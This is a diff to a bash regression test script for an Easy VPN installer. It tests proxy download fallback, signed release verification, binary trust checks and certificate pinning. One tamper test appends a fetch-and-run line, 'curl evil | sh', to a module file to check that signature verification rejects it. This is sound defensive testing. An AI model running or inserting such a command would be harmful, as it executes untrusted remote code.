@@ -38,7 +38,15 @@ grep -q 'MemTotal:' "$ROOT/modules/protocol.sh" || fail "total memory probe miss
 grep -q 'MemAvailable:' "$ROOT/modules/protocol.sh" || fail "available memory probe missing"
 grep -q 'df -Pm /' "$ROOT/modules/protocol.sh" || fail "root filesystem probe missing"
 grep -q 'raw.githubusercontent.com/%s/%s/%s' "$ROOT/install.sh" || fail "branch URL helper missing"
+grep -Fq 'https://gh-proxy.org/%s' "$ROOT/install.sh" || fail "domestic GitHub acceleration URL helper missing"
+grep -Fq 'EASY_VPN_GITHUB_SOURCE_MODE=china' "$ROOT/README.md" || fail "README domestic one-click install missing"
+grep -Fq 'curl -fsSL "https://raw.githubusercontent.com/yesok6/easy-vpn/main/install.sh" | sudo bash' "$ROOT/README.md" || fail "README official one-click install missing"
+! grep -Eq '你的用户名|你的仓库|EASY_VPN_GITHUB_USER=|EASY_VPN_GITHUB_REPO=' "$ROOT/README.md" || fail "README still asks users to configure repository owner/name"
 grep -q 'EASY_VPN_SHORTCUT:-/usr/local/bin/vpn' "$ROOT/install.sh" || fail "vpn shortcut default missing"
+grep -Fq 'EASY_VPN_UPPERCASE_SHORTCUT:-${SHORTCUT%/*}/VPN' "$ROOT/install.sh" || fail "uppercase VPN shortcut missing"
+grep -Fq 'install_uppercase_shortcut' "$ROOT/install.sh" || fail "uppercase VPN shortcut installation call missing"
+grep -Fq '下次可输入 VPN 快捷打开' "$ROOT/modules/protocol.sh" || fail "green main-menu shortcut hint missing"
+grep -Fq '快捷启动：下次打开终端输入 VPN（或 vpn）' "$ROOT/modules/protocol.sh" || fail "summary shortcut hint missing"
 grep -q 'remote-version' "$ROOT/modules/protocol.sh" || fail "explicit remote VERSION check missing"
 grep -q 'implemented == true' "$ROOT/modules/protocol.sh" || fail "unimplemented protocols must not be offered as available"
 grep -q 'modules/protocol.sh' "$ROOT/install.sh" || fail "protocol sync missing"
@@ -53,6 +61,182 @@ grep -q '^firewall_open_port_entries()' "$ROOT/lib/common.sh" || fail "firewall_
 # Regression tests for the six reviewed issues.
 regression_test=$(mktemp -d /tmp/easy-vpn-regression.XXXXXX)
 trap 'rm -rf -- "${regression_test:-}"' EXIT
+
+# Domestic-source mode builds the expected proxy prefix and persists for future shortcut runs.
+url_functions="${regression_test}/url-functions.sh"
+sed -n '/^raw_direct_base_url()/,/^}/p; /^raw_base_url()/,/^}/p' "$ROOT/install.sh" > "$url_functions"
+url_result=$(EASY_VPN_GITHUB_SOURCE_MODE=china GITHUB_USER=yesok6 GITHUB_REPO=easy-vpn EASY_VPN_BRANCH=main \
+    bash -c 'source "$1"; raw_base_url' _ "$url_functions") || fail "domestic source URL function failed"
+[[ "$url_result" == 'https://gh-proxy.org/https://raw.githubusercontent.com/yesok6/easy-vpn/main' ]] || fail "domestic source URL incorrect: $url_result"
+mode_functions="${regression_test}/mode-functions.sh"
+sed -n '/^proxy_unsigned_consent_saved()/,/^}/p; /^save_proxy_unsigned_consent()/,/^}/p; /^persist_github_source_mode()/,/^}/p; /^configure_github_source_mode()/,/^}/p' "$ROOT/install.sh" > "$mode_functions"
+mkdir -p "${regression_test}/mode-conf"
+LOG_DIR="${regression_test}/mode-conf" bash -c '
+    set -Eeuo pipefail
+    GITHUB_SOURCE_MODE_FILE="$LOG_DIR/github-source-mode"
+    PROXY_CONSENT_FILE="$LOG_DIR/allow-unsigned-proxy"
+    log_action() { :; }; RED=red; YELLOW=yellow; PLAIN=plain
+    EASY_VPN_RELEASE_PUBKEY=""
+    source "$1"
+    # An unconfirmed explicit request must fail before persisting china mode.
+    if EASY_VPN_GITHUB_SOURCE_MODE=china configure_github_source_mode >/dev/null 2>&1; then exit 11; fi
+    [[ ! -e "$GITHUB_SOURCE_MODE_FILE" ]] || exit 12
+    # Explicit consent stores a root-only record and mode for later menu-triggered updates.
+    EASY_VPN_ALLOW_UNSIGNED_PROXY=1 EASY_VPN_GITHUB_SOURCE_MODE=china configure_github_source_mode
+    [[ "$(cat "$GITHUB_SOURCE_MODE_FILE")" == china ]]
+    [[ "$(cat "$PROXY_CONSENT_FILE")" == yes && "$(stat -c %a "$PROXY_CONSENT_FILE")" == 600 ]]
+    # The stored opt-in must also permit an explicitly selected source on later runs.
+    unset EASY_VPN_ALLOW_UNSIGNED_PROXY
+    EASY_VPN_GITHUB_SOURCE_MODE=china configure_github_source_mode
+    unset EASY_VPN_GITHUB_SOURCE_MODE
+    configure_github_source_mode
+    [[ "$EASY_VPN_GITHUB_SOURCE_MODE" == china ]]
+    # Switching to official source revokes the opt-in.
+    EASY_VPN_GITHUB_SOURCE_MODE=direct configure_github_source_mode
+    [[ "$(cat "$GITHUB_SOURCE_MODE_FILE")" == direct && ! -e "$PROXY_CONSENT_FILE" ]]
+    # Repair a stale china setting from an older release that never saved consent.
+    printf "china\n" > "$GITHUB_SOURCE_MODE_FILE"
+    unset EASY_VPN_GITHUB_SOURCE_MODE EASY_VPN_ALLOW_UNSIGNED_PROXY
+    configure_github_source_mode
+    [[ "$EASY_VPN_GITHUB_SOURCE_MODE" == direct && "$(cat "$GITHUB_SOURCE_MODE_FILE")" == direct ]]
+' _ "$mode_functions" || fail "domestic source mode persistence/safety failed"
+
+# A failed GH-Proxy bundle request must fall back to the official Raw URL.
+download_functions="${regression_test}/download-functions.sh"
+sed -n '/^download_bundle_file()/,/^}/p' "$ROOT/install.sh" > "$download_functions"
+mkdir -p "${regression_test}/download-mockbin"
+cat > "${regression_test}/download-mockbin/curl" <<'MOCK_ACCEL_CURL'
+#!/usr/bin/env bash
+out=""; url=""
+while (($#)); do
+    case "$1" in
+        -o|--output) out="${2:-}"; shift 2 ;;
+        http://*|https://*) url="$1"; shift ;;
+        *) shift ;;
+    esac
+done
+case "$url" in
+    https://gh-proxy.org/*) exit 7 ;;
+    https://raw.githubusercontent.com/yesok6/easy-vpn/main/VERSION*) printf '1.0.14\n' > "$out" ;;
+    *) echo "unexpected fallback URL: $url" >&2; exit 8 ;;
+esac
+MOCK_ACCEL_CURL
+chmod 755 "${regression_test}/download-mockbin/curl"
+EASY_VPN_GITHUB_SOURCE_MODE=china PATH="${regression_test}/download-mockbin:$PATH" \
+    bash -c 'source "$1"; YELLOW=yellow; PLAIN=plain; download_bundle_file "https://gh-proxy.org/https://raw.githubusercontent.com/yesok6/easy-vpn/main" "https://raw.githubusercontent.com/yesok6/easy-vpn/main" VERSION "$2"' \
+    _ "$download_functions" "${regression_test}/downloaded-version" >/dev/null 2>&1 || fail "bundle direct fallback failed"
+[[ "$(cat "${regression_test}/downloaded-version")" == "1.0.14" ]] || fail "bundle fallback content incorrect"
+
+# Protocol update source helper must also use proxy first and direct Raw fallback.
+module_url_functions="${regression_test}/module-url-functions.sh"
+sed -n '/^easy_vpn_project_raw_url()/,/^}/p; /^easy_vpn_project_direct_raw_url()/,/^}/p; /^fetch_easy_vpn_project_file()/,/^}/p' "$ROOT/modules/protocol.sh" > "$module_url_functions"
+cat > "${regression_test}/download-mockbin/curl" <<'MOCK_MODULE_ACCEL_CURL'
+#!/usr/bin/env bash
+out=""; url=""
+while (($#)); do
+    case "$1" in
+        -o|--output) out="${2:-}"; shift 2 ;;
+        http://*|https://*) url="$1"; shift ;;
+        *) shift ;;
+    esac
+done
+case "$url" in
+    https://gh-proxy.org/*) exit 7 ;;
+    https://raw.githubusercontent.com/yesok6/easy-vpn/main/protocol_catalog.json) printf '{"schema_version":1,"tool_version":"1.0.14","protocols":[]}\n' > "$out" ;;
+    *) echo "unexpected module fallback URL: $url" >&2; exit 9 ;;
+esac
+MOCK_MODULE_ACCEL_CURL
+chmod 755 "${regression_test}/download-mockbin/curl"
+EASY_VPN_GITHUB_SOURCE_MODE=china PROTOCOL_BRANCH=main PATH="${regression_test}/download-mockbin:$PATH" \
+    bash -c 'source "$1"; YELLOW=yellow; PLAIN=plain; fetch_easy_vpn_project_file "$(easy_vpn_project_raw_url protocol_catalog.json)" "$(easy_vpn_project_direct_raw_url protocol_catalog.json)" "$2"' \
+    _ "$module_url_functions" "${regression_test}/module-catalog.json" >/dev/null 2>&1 || fail "protocol source direct fallback failed"
+jq -e '.tool_version == "1.0.14"' "${regression_test}/module-catalog.json" >/dev/null || fail "protocol source fallback content invalid"
+
+# 8a. Release signing: remote bundles must match a signed SHA256SUMS; the third-party proxy needs a signing key.
+bash -n "$ROOT/tools/release.sh" || fail "tools/release.sh syntax"
+grep -Fq '# >>> EASY_VPN_RELEASE_PUBKEY >>>' "$ROOT/install.sh" || fail "release public-key block missing"
+grep -Fq 'verify_bundle_signature "$temp" "${rels[@]}"' "$ROOT/install.sh" || fail "remote sync does not verify the release signature"
+grep -Fq 'require_verifiable_remote_source || return 1' "$ROOT/install.sh" || fail "proxy gate missing in remote sync"
+sign_test="${regression_test}/sign"
+mkdir -p "$sign_test/bundle/lib" "$sign_test/bundle/modules"
+sed -n '/^proxy_unsigned_consent_saved()/,/^}/p; /^require_verifiable_remote_source()/,/^}/p; /^verify_bundle_signature()/,/^}/p' "$ROOT/install.sh" > "$sign_test/functions.sh"
+openssl ecparam -name prime256v1 -genkey -noout -out "$sign_test/key.pem" 2>/dev/null
+openssl ec -in "$sign_test/key.pem" -pubout -out "$sign_test/pub.pem" 2>/dev/null
+openssl ecparam -name prime256v1 -genkey -noout -out "$sign_test/other.pem" 2>/dev/null
+openssl ec -in "$sign_test/other.pem" -pubout -out "$sign_test/other-pub.pem" 2>/dev/null
+printf '#!/bin/sh\n' > "$sign_test/bundle/install.sh"; printf 'a\n' > "$sign_test/bundle/lib/common.sh"
+printf 'b\n' > "$sign_test/bundle/modules/protocol.sh"; printf '{}\n' > "$sign_test/bundle/protocol_catalog.json"; printf '9.9.9\n' > "$sign_test/bundle/VERSION"
+(cd "$sign_test/bundle" && sha256sum install.sh lib/common.sh modules/protocol.sh protocol_catalog.json VERSION > SHA256SUMS)
+openssl dgst -sha256 -sign "$sign_test/key.pem" -out "$sign_test/sig.bin" "$sign_test/bundle/SHA256SUMS"
+openssl base64 -A -in "$sign_test/sig.bin" -out "$sign_test/bundle/SHA256SUMS.sig"; printf '\n' >> "$sign_test/bundle/SHA256SUMS.sig"
+sign_check() {  # $1 = bundle dir, $2 = public key file
+    PUBFILE="$2" bash -c '
+        set -Eeuo pipefail
+        log_action() { :; }; RED=; GREEN=; YELLOW=; PLAIN=
+        source "$1"
+        EASY_VPN_RELEASE_PUBKEY="$(cat "$PUBFILE")"
+        verify_bundle_signature "$2" install.sh lib/common.sh modules/protocol.sh protocol_catalog.json VERSION
+    ' _ "$sign_test/functions.sh" "$1"
+}
+sign_check "$sign_test/bundle" "$sign_test/pub.pem" || fail "genuine signed bundle was rejected"
+! sign_check "$sign_test/bundle" "$sign_test/other-pub.pem" || fail "bundle signed by a different key was accepted"
+cp -a "$sign_test/bundle" "$sign_test/tampered"; printf 'curl evil | sh\n' >> "$sign_test/tampered/modules/protocol.sh"
+! sign_check "$sign_test/tampered" "$sign_test/pub.pem" || fail "tampered file was accepted"
+cp -a "$sign_test/bundle" "$sign_test/nosig"; rm -f "$sign_test/nosig/SHA256SUMS.sig"
+! sign_check "$sign_test/nosig" "$sign_test/pub.pem" || fail "bundle without signature was accepted"
+cp -a "$sign_test/bundle" "$sign_test/swapped"; printf 'evil\n' >> "$sign_test/swapped/VERSION"
+evil_hash=$(sha256sum "$sign_test/swapped/VERSION" | awk '{print $1}')
+sed -i "s/^[0-9a-f]\{64\}  VERSION\$/${evil_hash}  VERSION/" "$sign_test/swapped/SHA256SUMS"
+! sign_check "$sign_test/swapped" "$sign_test/pub.pem" || fail "edited manifest with valid-looking hash was accepted"
+gate_check() {  # $1 = mode, $2 = pubkey, $3 = allow-unsigned flag, $4 = optional consent file
+    EASY_VPN_GITHUB_SOURCE_MODE="$1" KEY="$2" ALLOW="$3" CONSENT_FILE="${4:-}" bash -c '
+        log_action() { :; }; RED=; YELLOW=; PLAIN=
+        PROXY_CONSENT_FILE="$CONSENT_FILE"
+        source "$1"
+        EASY_VPN_RELEASE_PUBKEY="$KEY"
+        EASY_VPN_ALLOW_UNSIGNED_PROXY="$ALLOW"
+        require_verifiable_remote_source
+    ' _ "$sign_test/functions.sh" >/dev/null 2>&1
+}
+! gate_check china "" 0 || fail "unsigned third-party proxy source was allowed"
+gate_check china "" 1 || fail "explicit unsigned-proxy override was ignored"
+gate_check china "KEY" 0 || fail "signed proxy source was refused"
+gate_check direct "" 0 || fail "official direct source must not need a signing key"
+printf 'yes\n' > "$sign_test/consent"; chmod 600 "$sign_test/consent"
+gate_check china "" 0 "$sign_test/consent" || fail "persisted explicit proxy consent was not respected for later updates"
+# The maintainer tool must produce a bundle that the client check accepts (end to end).
+release_test="${sign_test}/release-tree"
+mkdir -p "$release_test"; cp -a "$ROOT/install.sh" "$ROOT/VERSION" "$ROOT/protocol_catalog.json" "$ROOT/lib" "$ROOT/modules" "$ROOT/tools" "$release_test/"
+EASY_VPN_RELEASE_KEY_DIR="${sign_test}/keys" bash "$release_test/tools/release.sh" init-key >/dev/null || fail "release.sh init-key failed"
+EASY_VPN_RELEASE_KEY_DIR="${sign_test}/keys" bash "$release_test/tools/release.sh" release >/dev/null || fail "release.sh release failed"
+EASY_VPN_RELEASE_KEY_DIR="${sign_test}/keys" bash "$release_test/tools/release.sh" verify >/dev/null || fail "release.sh verify failed"
+printf '# tamper\n' >> "$release_test/modules/protocol.sh"
+! EASY_VPN_RELEASE_KEY_DIR="${sign_test}/keys" bash "$release_test/tools/release.sh" verify >/dev/null 2>&1 || fail "release.sh verify accepted a modified file"
+
+# 8b. sing-box binary reuse requires a root-owned, non-group/world-writable binary and directory.
+trust_functions="${regression_test}/trust-functions.sh"
+sed -n '/^singbox_binary_is_trusted()/,/^}/p' "$ROOT/modules/protocol.sh" > "$trust_functions"
+mkdir -p "$regression_test/trust/safe" "$regression_test/trust/open"; chmod 755 "$regression_test/trust" "$regression_test/trust/safe"; chmod 777 "$regression_test/trust/open"
+printf '#!/bin/sh\n' > "$regression_test/trust/safe/sing-box"; chmod 755 "$regression_test/trust/safe/sing-box"
+cp "$regression_test/trust/safe/sing-box" "$regression_test/trust/open/sing-box"; chmod 755 "$regression_test/trust/open/sing-box"
+cp "$regression_test/trust/safe/sing-box" "$regression_test/trust/safe/group-writable"; chmod 775 "$regression_test/trust/safe/group-writable"
+bash -c 'source "$1"; singbox_binary_is_trusted "$2"' _ "$trust_functions" "$regression_test/trust/safe/sing-box" || fail "root-owned sing-box was not trusted"
+! bash -c 'source "$1"; singbox_binary_is_trusted "$2"' _ "$trust_functions" "$regression_test/trust/open/sing-box" || fail "sing-box in a world-writable directory was trusted"
+! bash -c 'source "$1"; singbox_binary_is_trusted "$2"' _ "$trust_functions" "$regression_test/trust/safe/group-writable" || fail "group-writable sing-box was trusted"
+grep -Fq 'singbox_binary_is_trusted "$candidate"' "$ROOT/modules/protocol.sh" || fail "resolve_singbox does not vet system sing-box"
+grep -Fq 'SINGBOX_VERSION 必须是 X.Y.Z' "$ROOT/modules/protocol.sh" || fail "SINGBOX_VERSION is not validated"
+
+# 8c. Self-signed Hysteria 2 / TUIC certificates are pinned by SHA-256 fingerprint.
+pin_functions="${regression_test}/pin-functions.sh"
+sed -n '/^cert_sha256_fingerprint()/,/^}/p' "$ROOT/modules/protocol.sh" > "$pin_functions"
+openssl req -x509 -nodes -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 -keyout "$regression_test/pin-key.pem" -out "$regression_test/pin-cert.pem" \
+    -days 365 -subj "/CN=www.example.com" -addext "subjectAltName=DNS:www.example.com" >/dev/null 2>&1
+pin_fp=$(bash -c 'source "$1"; cert_sha256_fingerprint "$2"' _ "$pin_functions" "$regression_test/pin-cert.pem") || fail "certificate fingerprint failed"
+pin_expected=$(openssl x509 -in "$regression_test/pin-cert.pem" -outform DER | sha256sum | awk '{print toupper($1)}')
+[[ "$pin_fp" == "$pin_expected" ]] || fail "certificate fingerprint does not match SHA-256 of the DER certificate"
+grep -Fq 'hy2_link+="&pinSHA256=${cert_fp}"' "$ROOT/modules/protocol.sh" || fail "Hysteria 2 link does not pin the certificate"
+grep -Fq '证书指纹 (SHA-256): ${cert_fp:-未能计算}' "$ROOT/modules/protocol.sh" || fail "node info does not show the certificate fingerprint"
+[[ $(grep -Fc 'fingerprint: $(yaml_quote "$cert_fp")' "$ROOT/modules/protocol.sh") -eq 2 ]] || fail "Clash export must pin both Hysteria 2 and TUIC"
 
 # 9. Standard ports 80/443 are accepted and systemd grants only the needed bind capability.
 EASY_VPN_ROOT="$regression_test/root" EASY_VPN_ETC="$regression_test/etc" \
@@ -618,9 +802,9 @@ esac
 MOCK_CURL
 chmod 755 "$update_test/mockbin/curl" "$update_test/mockbin/sing-box"
 cp "$update_test/same/protocol_catalog.json" "$update_test/new/protocol_catalog.json"
-jq --arg version '1.0.13' '.tool_version = $version' "$update_test/new/protocol_catalog.json" > "$update_test/new/catalog.tmp"
+jq --arg version '1.0.18' '.tool_version = $version' "$update_test/new/protocol_catalog.json" > "$update_test/new/catalog.tmp"
 mv "$update_test/new/catalog.tmp" "$update_test/new/protocol_catalog.json"
-printf '1.0.13\n' > "$update_test/new/VERSION"
+printf '1.0.18\n' > "$update_test/new/VERSION"
 no_update_output=$(printf '0\n' | PATH="$update_test/mockbin:$PATH" MOCK_REMOTE_DIR="$update_test/same" \
     EASY_VPN_ROOT="$ROOT" EASY_VPN_ETC="$update_test/etc" EASY_VPN_STATE="$update_test/state" \
     EASY_VPN_BACKUPS="$update_test/backups" EASY_VPN_LOG="$update_test/log" \
@@ -661,8 +845,10 @@ if [[ $EUID -eq 0 ]]; then
     [[ -f "$isolated/root/modules/protocol.sh" ]] || fail "protocol module not copied"
     [[ ! -e "$isolated/root/modules/security.sh" && ! -e "$isolated/root/modules/apps.sh" && ! -e "$isolated/root/modules/optimize.sh" && ! -e "$isolated/root/modules/ip_test.sh" ]] || fail "unrelated modules installed"
     [[ -x "$isolated/bin/vpn" ]] || fail "vpn shortcut not installed"
+    [[ -x "$isolated/bin/VPN" ]] || fail "uppercase VPN shortcut not installed"
+    grep -Fq "$isolated/root/install.sh" "$isolated/bin/VPN" || fail "uppercase VPN shortcut points to wrong installer"
     grep -q '没有可交互终端' "$isolated/install.log" || fail "non-interactive install should explain how to open the menu"
-    grep -q '打开菜单' "$isolated/install.log" && grep -q 'vpn' "$isolated/install.log" || fail "non-interactive install should tell user to run vpn"
+    grep -q '打开菜单' "$isolated/install.log" && grep -q 'VPN' "$isolated/install.log" || fail "non-interactive install should tell user to run VPN"
     ! grep -q 'Easy VPN 协议搭建工具' "$isolated/install.log" || fail "installer should not call a menu with unreadable stdin"
 
     # With a controlling TTY but a piped/EOF stdin, the installer must reopen /dev/tty and show the menu.
@@ -676,6 +862,8 @@ if [[ $EUID -eq 0 ]]; then
             }
         grep -q 'Easy VPN 协议搭建工具' "$isolated/tty-session.log" || fail "installer did not restore TTY for the menu"
         grep -q '0. 退出' "$isolated/tty-session.log" || fail "menu exit option was not shown on TTY"
+        grep -q '下次可输入 VPN 快捷打开' "$isolated/tty-session.log" || fail "main-menu shortcut hint was not shown on TTY"
+        grep -q '快捷启动：下次打开终端输入 VPN（或 vpn）' "$isolated/tty-session.log" || fail "summary shortcut hint was not shown on TTY"
     fi
 
     # Only remove the previous shortcut if it is our own wrapper pointing at this installation.
@@ -687,6 +875,7 @@ if [[ $EUID -eq 0 ]]; then
         fail "shortcut migration run"
     }
     [[ -x "$isolated/bin/vpn" ]] || fail "vpn shortcut lost after reinstall"
+    [[ -x "$isolated/bin/VPN" ]] || fail "uppercase VPN shortcut lost after reinstall"
     [[ ! -e "$isolated/bin/easy-vpn" ]] || fail "legacy Easy VPN shortcut was not removed"
 
     # Verify an invalid-to-load module cannot replace the working installed bundle.
@@ -972,11 +1161,12 @@ grep -Fq 'PIPELINE=1 ARG=pipeline' <<< "$cli_dispatch_output" || fail "CLI pipel
 # 24. Shortcut installation creates a missing parent directory before using install(1).
 grep -Fq 'mkdir -p -- "$shortcut_dir"' "$ROOT/install.sh" || fail "shortcut parent directory is not created"
 awk '/^install_shortcut\(\) \{$/{capture=1} capture{print} capture && /^}$/ {exit}' "$ROOT/install.sh" > "$regression_test/shortcut-function.sh"
+awk '/^install_uppercase_shortcut\(\) \{$/{capture=1} capture{print} capture && /^}$/ {exit}' "$ROOT/install.sh" >> "$regression_test/shortcut-function.sh"
 shortcut_root="$regression_test/shortcut-parent-missing"
 mkdir -p "$shortcut_root"
-SHORTCUT="$shortcut_root/usr/local/bin/vpn" LOCAL_ROOT="$shortcut_root/installed" LEGACY_SHORTCUT="$shortcut_root/usr/local/bin/easy-vpn" LOG_DIR="$shortcut_root/etc" \
-  bash -c 'source "$1"; install_shortcut; [[ -x "$SHORTCUT" ]]; grep -Fq "$LOCAL_ROOT/install.sh" "$SHORTCUT"' _ "$regression_test/shortcut-function.sh" \
-  || fail "shortcut install fails when parent directory does not exist"
+SHORTCUT="$shortcut_root/usr/local/bin/vpn" UPPERCASE_SHORTCUT="$shortcut_root/usr/local/bin/VPN" LOCAL_ROOT="$shortcut_root/installed" LEGACY_SHORTCUT="$shortcut_root/usr/local/bin/easy-vpn" LOG_DIR="$shortcut_root/etc" \
+  bash -c 'source "$1"; install_shortcut; install_uppercase_shortcut; [[ -x "$SHORTCUT" && -x "$UPPERCASE_SHORTCUT" ]]; grep -Fq "$LOCAL_ROOT/install.sh" "$SHORTCUT"; grep -Fq "$LOCAL_ROOT/install.sh" "$UPPERCASE_SHORTCUT"' _ "$regression_test/shortcut-function.sh" \
+  || fail "lowercase/uppercase shortcut install fails when parent directory does not exist"
 
 # 25. IPv6 URI authorities must be bracketed, while saved host addresses stay unbracketed.
 EASY_VPN_ROOT="$regression_test/root" EASY_VPN_ETC="$regression_test/etc" EASY_VPN_STATE="$regression_test/state" EASY_VPN_BACKUPS="$regression_test/backups" EASY_VPN_LOG="$regression_test/log" \
@@ -1122,9 +1312,6 @@ PATH="$LISTENER_TEST_ROOT/bin:$PATH" EASY_VPN_ROOT="$LISTENER_TEST_ROOT/root" EA
   protocol_listener_is_up vless
 ' _ "$ROOT" || fail "service listener ownership test failed"
 
-# success banner moved to the end after all regression tests
-
-
 # 35. Project/kernel versions are accepted only as stable X.Y.Z to prevent suffixes or four-component versions being misordered.
 awk '/^easy_vpn_version_gt\(\) \{$/{capture=1} capture{print} capture && /^}/{exit}' "$ROOT/install.sh" > "$regression_test/version-compare-install.sh"
 bash -c '
@@ -1141,9 +1328,6 @@ bash -c '
   if protocol_version_gt 1.0.12.1 1.0.11; then exit 2; fi
 ' _ "$regression_test/version-compare-protocol.sh" || fail "protocol version comparator accepted unsupported version format"
 
-# success banner follows the final fstab-symlink regression
-
-
 # 36. fstab symlinks are rejected rather than followed or replaced.
 FSTAB_LINK_ROOT="$regression_test/fstab-symlink"
 mkdir -p "$FSTAB_LINK_ROOT/etc" "$FSTAB_LINK_ROOT/state" "$FSTAB_LINK_ROOT/backups"
@@ -1156,8 +1340,6 @@ EASY_VPN_ROOT="$FSTAB_LINK_ROOT/root" EASY_VPN_ETC="$FSTAB_LINK_ROOT/etc" EASY_V
   grep -Fxq SAFE-ORIGINAL "${2}.target" 2>/dev/null && exit 3 || true
   grep -Fxq SAFE-ORIGINAL "$(readlink -f "$2")"
 ' _ "$ROOT" "$FSTAB_LINK_ROOT/etc/fstab" || fail "fstab symlink was followed or target was modified"
-
-echo 'Easy VPN smoke tests: OK'
 
 # 37. Large sing-box archive+extraction needs its own space budget, while small work keeps the default.
 TEMP_SPACE_ROOT="$regression_test/temp-space"
@@ -1187,3 +1369,25 @@ EASY_VPN_ROOT="$RESTORE_TYPE_ROOT/root" EASY_VPN_ETC="$RESTORE_TYPE_ROOT/etc" EA
   [[ ! -e "$2/restored" ]] || exit 3
 ' _ "$ROOT" "$RESTORE_TYPE_ROOT/etc/target-dir" || fail "restore_file_backup accepted a directory target"
 
+# 39. Ctrl-D at the port-hopping range prompt must cancel Hysteria 2 deployment cleanly.
+HOP_EOF_ROOT="$regression_test/port-hop-eof"
+mkdir -p "$HOP_EOF_ROOT/root" "$HOP_EOF_ROOT/etc" "$HOP_EOF_ROOT/state" "$HOP_EOF_ROOT/backups"
+hop_eof_output=$(printf '54321\nY\n' | EASY_VPN_ROOT="$HOP_EOF_ROOT/root" EASY_VPN_ETC="$HOP_EOF_ROOT/etc" \
+    EASY_VPN_STATE="$HOP_EOF_ROOT/state" EASY_VPN_BACKUPS="$HOP_EOF_ROOT/backups" EASY_VPN_LOG="$HOP_EOF_ROOT/log" \
+    bash -c '
+      set -Eeuo pipefail
+      source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
+      clear() { :; }
+      get_random_protocol_port() { printf "54321\n"; }
+      port_in_use() { return 1; }
+      state_exists() { return 1; }
+      check_protocol_resources() { echo DEPLOY_CONTINUED_AFTER_EOF; return 1; }
+      rc=0; deploy_hysteria2 || rc=$?
+      [[ "$rc" -eq 1 ]]
+    ' _ "$ROOT" 2>&1) || fail "Ctrl-D at port-hopping prompt did not return cleanly"
+grep -Fq '未读取到端口范围输入' <<< "$hop_eof_output" || fail "port-hopping EOF cancellation message missing"
+! grep -Fq 'DEPLOY_CONTINUED_AFTER_EOF' <<< "$hop_eof_output" || fail "Hysteria 2 deployment continued after port-hopping EOF"
+
+# The success banner must be the final command so failed late regressions cannot print OK first.
+
+echo 'Easy VPN smoke tests: OK'
